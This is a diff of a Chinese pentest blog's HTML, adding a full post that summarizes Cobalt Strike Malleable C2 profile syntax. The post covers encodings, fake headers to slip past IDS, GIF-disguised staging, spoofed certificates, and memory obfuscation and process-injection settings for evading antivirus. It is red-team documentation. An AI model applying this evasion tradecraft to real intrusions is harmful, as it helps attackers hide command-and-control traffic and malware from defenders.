+              <time title="Erstellt: 2019-07-18 10:40:27 / Geändert am: 10:50:21" itemprop="dateCreated datePublished" datetime="2019-07-18T10:40:27+08:00">2019-07-18</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a></span>
 
                 
                 
@@ -466,21 +690,9 @@
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -488,68 +700,30 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
-
-      
-        
-          
-          起因
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/18/mimikatz中的tspkg、MSV1-0、WDigest、kerberos/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          <h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3>
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2019/07/17/MalleableC2总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -561,53 +735,38 @@
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/17/MalleableC2总结/" itemprop="url">MalleableC2总结</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/17/MalleableC2总结/" class="post-title-link" itemprop="url">MalleableC2总结</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-17T13:14:20+08:00">
-                2019-07-17
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2019-07-17 13:14:20 / Geändert am: 13:15:41" itemprop="dateCreated datePublished" datetime="2019-07-17T13:14:20+08:00">2019-07-17</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a></span>
 
                 
                 
@@ -616,21 +775,9 @@
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -638,69 +785,568 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>一个profile的基本结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#注释</span><br><span class="line">#设置全局的配置</span><br><span class="line">set global_option &quot;value&quot;;</span><br><span class="line"></span><br><span class="line">#对某个传输方法进行配置</span><br><span class="line">protocol-transaction&#123;</span><br><span class="line">	#配置局部的配置</span><br><span class="line">	set local_option &quot;value&quot;;</span><br><span class="line">	</span><br><span class="line">	#客户端配置块</span><br><span class="line">	client&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	#服务器配置块</span><br><span class="line">	server&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>#符号是单行注释，set关键字用来设置某项配置的值。花括号用来圈定某一块配置的范围。</p>
+<h2 id="数据传输编码"><a href="#数据传输编码" class="headerlink" title="数据传输编码"></a>数据传输编码</h2><p>一个数据传输编码的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">	set uri &quot;/foobar&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">		metadata &#123;</span><br><span class="line">			base64;</span><br><span class="line">			prepend &quot;user=&quot;;</span><br><span class="line">			header &quot;Cookie&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>正向动作</th>
+<th>反向动作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>append “string”</td>
+<td>追加字符串“string”</td>
+<td>去掉最后“string”长度的字符串</td>
+</tr>
+<tr>
+<td>base64</td>
+<td>base64编码</td>
+<td>base64解码</td>
+</tr>
+<tr>
+<td>base64url</td>
+<td>URL-safe base64编码</td>
+<td>URL-safe base64解码</td>
+</tr>
+<tr>
+<td>mask</td>
+<td>随机key进行XOR  mask w</td>
+<td>使用相同的key进行XOR mask w</td>
+</tr>
+<tr>
+<td>netbios</td>
+<td>netbios 编码‘a’</td>
+<td>netbios解码‘a’</td>
+</tr>
+<tr>
+<td>netbiosu</td>
+<td>netbios解码’A’</td>
+<td>netbios解码‘A’</td>
+</tr>
+<tr>
+<td>prepend “string”</td>
+<td>开头插入“string”</td>
+<td>从开头去掉“string”长度的字符串</td>
+</tr>
+</tbody>
+</table>
+<p>一次数据传输可以以任意次序使用上述任意个传输编码指令，例如你可以先用netbios编码一下，然后加点东西，最后用base64编码编码整个数据部分。也就是你的语句先后顺序会影响数据的处理。</p>
+<p>数据传输部分必须以一个告诉客户端和服务端传送的数据在什么位置的指令为结束。以下有四个结束语句。</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>header “header”</td>
+<td>把数据放到名为header的http头中</td>
+</tr>
+<tr>
+<td>parameter “key”</td>
+<td>把数据放到名为key的uri参数中</td>
+</tr>
+<tr>
+<td>print</td>
+<td>把数据放到http响应body中</td>
+</tr>
+<tr>
+<td>uri-append</td>
+<td>把数据直接追加到URI上</td>
+</tr>
+</tbody>
+</table>
+<p>值得注意的是，print语句只能用在服务端的输出中，也就是只能用在http-get.server.output、http-post.server.output和http-stager.server.output的配置块中。其他的语句你可以任意使用。</p>
+<p>如果你同时使用了header、parameter和 uri-append在httppost.client.output配置块中， beacon会合理划分响应的数据，适应这种传输方式。</p>
+<h2 id="特殊字符串格式"><a href="#特殊字符串格式" class="headerlink" title="特殊字符串格式"></a>特殊字符串格式</h2><p>cobalt strike的profile多个地方支持自定义的字符串，同时他还支持如下的特殊字符串格式。</p>
+<table>
+<thead>
+<tr>
+<th>输入的值</th>
+<th>解析出的值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>“\n”</td>
+<td>换行符</td>
+</tr>
+<tr>
+<td>“\r”</td>
+<td>回车</td>
+</tr>
+<tr>
+<td>“\t”</td>
+<td>tab</td>
+</tr>
+<tr>
+<td>“\u###”</td>
+<td>unicode字符串</td>
+</tr>
+<tr>
+<td>“\x##”</td>
+<td>一个字节</td>
+</tr>
+<tr>
+<td>“\\“</td>
+<td>反斜线</td>
+</tr>
+</tbody>
+</table>
+<h2 id="头信息和参数"><a href="#头信息和参数" class="headerlink" title="头信息和参数"></a>头信息和参数</h2><p>可以 向通信过程中加入一些无用的数据来混淆视听，让你的C2通信更像正常的访问请求，以期绕过IDS。在client或者server的配置块下加入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">	client &#123;</span><br><span class="line">		parameter &apos;bar&apos; &apos;bbb&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		header &quot;xxxxx&quot; &quot;aaaaa&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置项有全局的配置和局部的配置，局部配置只能针对特定的配置块。使用set语句进行配置设置。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &quot;sleeptime&quot; &quot;1000&quot;;</span><br></pre></td></tr></table></figure>
+<p>目前支持的配置如下：</p>
+<table>
+<thead>
+<tr>
+<th>配置名称</th>
+<th>配置块</th>
+<th>默认值</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>amsi_disable</td>
+<td></td>
+<td>false</td>
+<td>为了execute-assembly、powerpick和psinject去试图禁用AMSI</td>
+</tr>
+<tr>
+<td>dns_idle</td>
+<td></td>
+<td>0.0.0.0</td>
+<td>cs通过返回这个ip地址去告诉客户端没有安排任务</td>
+</tr>
+<tr>
+<td>dns_max_txt</td>
+<td></td>
+<td>252</td>
+<td>DNS TXT响应的最大长度</td>
+</tr>
+<tr>
+<td>dns_sleep</td>
+<td></td>
+<td>0</td>
+<td>每次dns请求之间的间隔（以毫秒为间隔）</td>
+</tr>
+<tr>
+<td>dns_stager_prepend</td>
+<td></td>
+<td></td>
+<td>在dns payload之前插入内容</td>
+</tr>
+<tr>
+<td>dns_stagersubhost</td>
+<td></td>
+<td>.stage.123456</td>
+<td>dns txt记录使用的子域名</td>
+</tr>
+<tr>
+<td>dns_ttl</td>
+<td></td>
+<td>1</td>
+<td>dns的ttl，默认1秒</td>
+</tr>
+<tr>
+<td>host_stage</td>
+<td></td>
+<td>true</td>
+<td>把http、https和dns的payload放在服务器上</td>
+</tr>
+<tr>
+<td>jitter</td>
+<td></td>
+<td>0</td>
+<td>针对睡眠时间的抖动率，随机睡眠。（0-99% ）</td>
+</tr>
+<tr>
+<td>maxdns</td>
+<td></td>
+<td>255</td>
+<td>当通过dns上传数据时，主机名的最大长度</td>
+</tr>
+<tr>
+<td>pipename</td>
+<td></td>
+<td>msagent_##</td>
+<td>用于smb beacon之间的通信的管道名称。##会被随机数字所替换</td>
+</tr>
+<tr>
+<td>pipename_stager</td>
+<td></td>
+<td>status_##</td>
+<td>stager使用的管道名，##会被随机数字替换。</td>
+</tr>
+<tr>
+<td>sample_name</td>
+<td></td>
+<td>随意的名字</td>
+<td>给你的profile起个名字，用在报告里</td>
+</tr>
+<tr>
+<td>sleeptime</td>
+<td></td>
+<td>60000</td>
+<td>睡眠时间，以毫秒为单位</td>
+</tr>
+<tr>
+<td>spawnto_x86</td>
+<td></td>
+<td>%windir%\syswow64\rundll32.exe</td>
+<td>x86默认打开并注入shellcode的进程</td>
+</tr>
+<tr>
+<td>spawnto_x64</td>
+<td></td>
+<td>%windir%\sysnative\rundll32.exe</td>
+<td>x64默认打开并注入shellcode的进程</td>
+</tr>
+<tr>
+<td>tcp_port</td>
+<td></td>
+<td>4444</td>
+<td>tcp beacon 监听的端口</td>
+</tr>
+<tr>
+<td>useragent</td>
+<td></td>
+<td>Internet    Explorer（ 随机）</td>
+<td>指定一个useragent</td>
+</tr>
+<tr>
+<td>uri</td>
+<td>http-get、http-post</td>
+<td>( 必须的配置）</td>
+<td>数据传输请求的uri</td>
+</tr>
+<tr>
+<td>uri_x86</td>
+<td>http-stager</td>
+<td></td>
+<td>x86 payload stage</td>
+</tr>
+<tr>
+<td>uri_x64</td>
+<td>http-stager</td>
+<td></td>
+<td>x64 payload stage</td>
+</tr>
+<tr>
+<td>verb</td>
+<td>http-get、http-post</td>
+<td>GET、POST</td>
+<td>使用什么方法进行数据传输</td>
+</tr>
+</tbody>
+</table>
+<p>你可以指定多个uri，如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set uri &quot;/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php&quot;;</span><br></pre></td></tr></table></figure>
+<p>虽然存在useragent配置，但是可以用header配置去覆盖。</p>
+<h2 id="一次beacon通信的全过程"><a href="#一次beacon通信的全过程" class="headerlink" title="一次beacon通信的全过程"></a>一次beacon通信的全过程</h2><ul>
+<li>beacon携带metadata以GET方法请求Cobalt Strike web 服务器。（metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要将其所使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。）</li>
+<li>cs web服务器响应该请求，返回一块加密的二进制数据，你可以在http-get的output的配置块底下进行配置，对它进行编码。当所有任务完成，客户端会查看是否有输出，如果没有输出，beacon开始睡眠，如果有输出，则开始准备开始进行POST请求。</li>
+<li>HTTP POST请求包含通过URI参数传递的id参数，用来标识，该输出是哪个beacon的，POST请求携带的内容也是一块加密的二进制数据，但是没有进行编码，你可以通过http-post下的client的output配置块进行配置。</li>
+<li>cs服务器也许需要响应POST请求，beacon不会取用响应内容，你可以通过http-post下的server下的output配置块进行配置。</li>
+</ul>
+<p>默认情况下http-get使用GET方法，http-post使用POST方法，但是你可以通过verb配置项去改变它。</p>
+<p>通信过程中客户端和服务器发送接收的数据，或者说这是profile可自定义的项目。</p>
+<table>
+<thead>
+<tr>
+<th>请求</th>
+<th>主体</th>
+<th>数据块</th>
+<th>数据内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>http-get</td>
+<td>client</td>
+<td>metadata</td>
+<td>session的metadata</td>
+</tr>
+<tr>
+<td>http-get</td>
+<td>server</td>
+<td>output</td>
+<td>beacon的任务</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>client</td>
+<td>id</td>
+<td>完成任务的session id</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>client</td>
+<td>output</td>
+<td>beacon完成任务的结果</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>server</td>
+<td>output</td>
+<td>空</td>
+</tr>
+<tr>
+<td>http-stager</td>
+<td>server</td>
+<td>output</td>
+<td>编码的payload stage</td>
+</tr>
+</tbody>
+</table>
+<h2 id="HTTP-Staging"><a href="#HTTP-Staging" class="headerlink" title="HTTP Staging"></a>HTTP Staging</h2><p>beacon是通过stager下载到内存中去的。在beacon注入目标内存之前，http-get和http-post都不会生效。你可以自己定义stager下载stage的行为。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">	set uri_x86 &quot;/get32.gif&quot;;</span><br><span class="line">	set uri_x64 &quot;/get64.gif&quot;;</span><br><span class="line">	client &#123;</span><br><span class="line">		parameter &quot;id&quot; &quot;1234&quot;;</span><br><span class="line">		header &quot;Cookie&quot; &quot;SomeValue&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	server &#123;</span><br><span class="line">		header &quot;Conten-Type&quot; &quot;image/gif&quot;;</span><br><span class="line">		output &#123;</span><br><span class="line">			prepend &quot;GIF89a&quot;;</span><br><span class="line">			print;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h2><p>http-config可以配置所以的cs服务器的相应头。优先级最低，相当于配置一个默认配置。set headers设置http头的顺序，不在该列表中的，就被加到最后。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">	set headers &quot;Date, Server, Content-Length, Keep-Alive,Connection, Content-Type&quot;;</span><br><span class="line">	header &quot;Server&quot; &quot;Apache&quot;;</span><br><span class="line">	header &quot;Keep-Alive&quot; &quot;timeout=5, max=100&quot;;</span><br><span class="line">	header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="自签名证书保护下的SSL-beacon"><a href="#自签名证书保护下的SSL-beacon" class="headerlink" title="自签名证书保护下的SSL beacon"></a>自签名证书保护下的SSL beacon</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set https cert info</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    set CN       &quot;*.wikipedia.org&quot;; #Common Name</span><br><span class="line">    set C        &quot;US&quot;; #Country</span><br><span class="line">    set L        &quot;San Francisco&quot;; #Locality</span><br><span class="line">    set OU       &quot;Wikimedia Foundation Inc&quot;; #Organizational Unit Name</span><br><span class="line">    set ST       &quot;CA&quot;; #State or Province</span><br><span class="line">    set validity &quot;365&quot;; #Number of days the cert is valid for</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>配置项</th>
+<th>示例</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C</td>
+<td>US</td>
+<td>国家</td>
+</tr>
+<tr>
+<td>CN</td>
+<td>beacon.cobaltstrike.com</td>
+<td>域名</td>
+</tr>
+<tr>
+<td>L</td>
+<td>Washington</td>
+<td>地区</td>
+</tr>
+<tr>
+<td>O</td>
+<td>Strategic Cyber LLC</td>
+<td>组织名</td>
+</tr>
+<tr>
+<td>OU</td>
+<td>Certificate    Department</td>
+<td>组织单位名称</td>
+</tr>
+<tr>
+<td>ST</td>
+<td>DC</td>
+<td>州或者省</td>
+</tr>
+<tr>
+<td>validity</td>
+<td>365</td>
+<td>时效</td>
+</tr>
+</tbody>
+</table>
+<h2 id="合法签名保护下的SSL-beacon"><a href="#合法签名保护下的SSL-beacon" class="headerlink" title="合法签名保护下的SSL beacon"></a>合法签名保护下的SSL beacon</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">	set keystore &quot;domain.store&quot;;</span><br><span class="line">	set password &quot;mypassword&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="代码签名"><a href="#代码签名" class="headerlink" title="代码签名"></a>代码签名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code-signer &#123;</span><br><span class="line">	set keystore &quot;keystore.jks&quot;;</span><br><span class="line">	set password &quot;password&quot;;</span><br><span class="line">	set alias &quot;server&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>配置项</th>
+<th>示例</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>alias</td>
+<td>server</td>
+<td>证书别名</td>
+</tr>
+<tr>
+<td>digest_algorithm</td>
+<td>SHA256</td>
+<td>摘要算法</td>
+</tr>
+<tr>
+<td>keystore</td>
+<td>keystore.jks</td>
+<td>java kerstore文件</td>
+</tr>
+<tr>
+<td>password</td>
+<td>pass</td>
+<td>keystore文件的打开密码</td>
+</tr>
+<tr>
+<td>timestamp</td>
+<td>false</td>
+<td>使用第三方服务为文件打上时间戳</td>
+</tr>
+<tr>
+<td>timestamp_url</td>
+<td><a href="http://timestamp.digicert.com" target="_blank" rel="noopener">http://timestamp.digicert.com</a></td>
+<td>timestamp服务的url</td>
+</tr>
+</tbody>
+</table>
+<h2 id="PE和内存自定义"><a href="#PE和内存自定义" class="headerlink" title="PE和内存自定义"></a>PE和内存自定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">set userwx &quot;false&quot;;</span><br><span class="line">set compile_time &quot;14 Jul 2009 8:14:00&quot;;</span><br><span class="line">set image_size_x86 &quot;512000&quot;;</span><br><span class="line">set image_size_x64 &quot;512000&quot;;</span><br><span class="line">set obfuscate &quot;true&quot;;</span><br><span class="line">transform-x86 &#123;</span><br><span class="line">prepend &quot;\x90\x90&quot;;</span><br><span class="line">strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;</span><br><span class="line">&#125;</span><br><span class="line">transform-x64 &#123;</span><br><span class="line"># transform the x64 rDLL stage</span><br><span class="line">&#125;</span><br><span class="line">stringw &quot;I am not Beacon&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>stringw 是宽字节字符串</p>
+<table>
+<thead>
+<tr>
+<th>配置项</th>
+<th>示例</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>checksum</td>
+<td>0</td>
+<td>PE头里checksum的值</td>
+</tr>
+<tr>
+<td>cleanup</td>
+<td>false</td>
+<td>尝试释放反射加载的dll的内存</td>
+</tr>
+<tr>
+<td>compile_time</td>
+<td>14 July 2009 8:14:00</td>
+<td>PE头里的编译时间</td>
+</tr>
+<tr>
+<td>entry_point</td>
+<td>92145</td>
+<td>PE头里的入口点</td>
+</tr>
+<tr>
+<td>image_size_x64</td>
+<td>512000</td>
+<td>x64 PE头里写的镜像大小</td>
+</tr>
+<tr>
+<td>image_size_x86</td>
+<td>512000</td>
+<td>x86 PE头里写的镜像大小</td>
+</tr>
+<tr>
+<td>module_x86</td>
+<td>xpsservices.dll</td>
+<td>加载一个dll，然后用beacon去覆盖这个dll，而不是用VirtualAlloc去分配内存</td>
+</tr>
+<tr>
+<td>module_x64</td>
+<td>xpsservices.dll</td>
+<td>同上，但是这个是针对x64的</td>
+</tr>
+<tr>
+<td>name</td>
+<td>beacon.x64.dll</td>
+<td>导出的名字</td>
+</tr>
+<tr>
+<td>obfuscate</td>
+<td>false</td>
+<td>是否混淆</td>
+</tr>
+<tr>
+<td>rich_header</td>
+<td></td>
+<td>编译器插入的元信息</td>
+</tr>
+<tr>
+<td>sleep_mask</td>
+<td>false</td>
+<td>在睡眠之前进行混淆</td>
+</tr>
+<tr>
+<td>stomppe</td>
+<td>true</td>
+<td>加载完dll之后覆盖pe mz头信息</td>
+</tr>
+<tr>
+<td>userwx</td>
+<td>false</td>
+<td>反射加载时是否要把内存设置为可读可写可执行</td>
+</tr>
+</tbody>
+</table>
+<h2 id="PE头克隆"><a href="#PE头克隆" class="headerlink" title="PE头克隆"></a>PE头克隆</h2><p>./peclone    [/path/to/sample.dll] </p>
+<p>会直接生成一个可以直接使用的stage配置块。</p>
+<h2 id="内存混淆免杀的全过程"><a href="#内存混淆免杀的全过程" class="headerlink" title="内存混淆免杀的全过程"></a>内存混淆免杀的全过程</h2><p>使用prepend配置可以绕过只检测前几个字节来发现内存注入行为的AV。如果是检测特定字符串的AV，就可以使用strrep配置来绕过。</p>
+<p>如果靠strrep还绕不过，那就使用sleep_mask，让beacon在睡眠之前混淆自己。睡眠结束之后，就反混淆，并且进行正常请求，每当beacon在睡眠或者等他的父session的指令时，都会混淆自己。</p>
+<p>轻度混淆使用stomppe，重度混淆使用obfuscate。</p>
+<p>默认情况下，beacon会使用VirtualAlloc申请内存，然后写入dll。但是也可以使用内存模块覆盖的方式去写入dll。将module_x86设置成一个大约比beacon payload大两倍的dll，beacon将会加载它，然后在内存中找到他的地址，然后覆盖它。module_x64也是类似的。</p>
+<p>如果怕内存中stage被检测出来，可以设置cleanup为true，这样的话，当stage没用了之后就释放掉。</p>
+<h2 id="进程注入行为定义"><a href="#进程注入行为定义" class="headerlink" title="进程注入行为定义"></a>进程注入行为定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">process-inject &#123;</span><br><span class="line">set min_alloc &quot;16384&quot;;</span><br><span class="line">set startrwx &quot;true&quot;;</span><br><span class="line">set userwx &quot;false&quot;;</span><br><span class="line">transform-x86 &#123;</span><br><span class="line">prepend “\x90\x90”;</span><br><span class="line">&#125;</span><br><span class="line">transform-x64 &#123;</span><br><span class="line"># transform x64 injected content</span><br><span class="line">&#125;</span><br><span class="line">disable &quot;CreateRemoteThread&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>transform-x86和transform-x64定义beacon注入的内容，支持prepend和append两个配置。要确保注入的内容是可以在x86或者x64的机器上运行的代码，c2init并不会去检查插入的内容是否合法。</p>
+<p>disable配置用了禁用一些在dll注入中使用的函数。禁用这些函数可能会引起可避免的错误，c2init会提示这些错误。</p>
+<p>其他配置：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>示例</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>min_alloc</td>
+<td>4096</td>
+<td>当注入时，最少申请多少内存。</td>
+</tr>
+<tr>
+<td>startrwx</td>
+<td>false</td>
+<td>是否使用rwx作为代码内存的默认权限，替代权限是rw</td>
+</tr>
+<tr>
+<td>userwx</td>
+<td>false</td>
+<td>同上，但是替代权限是rx</td>
+</tr>
+</tbody>
+</table>
 
-      
-        
-          
-          基本结构一个profile的基本结构如下：
-123456789101112131415161718#注释#设置全局的配置set global_option &quot;value&quot;;#对某个传输方法进行配置protocol-transaction&#123;	#配置局部的配置	set lo
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/17/MalleableC2总结/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2019/07/17/域内信息收集/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -712,53 +1358,38 @@
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/17/域内信息收集/" itemprop="url">域内信息收集</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/17/域内信息收集/" class="post-title-link" itemprop="url">域内信息收集</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
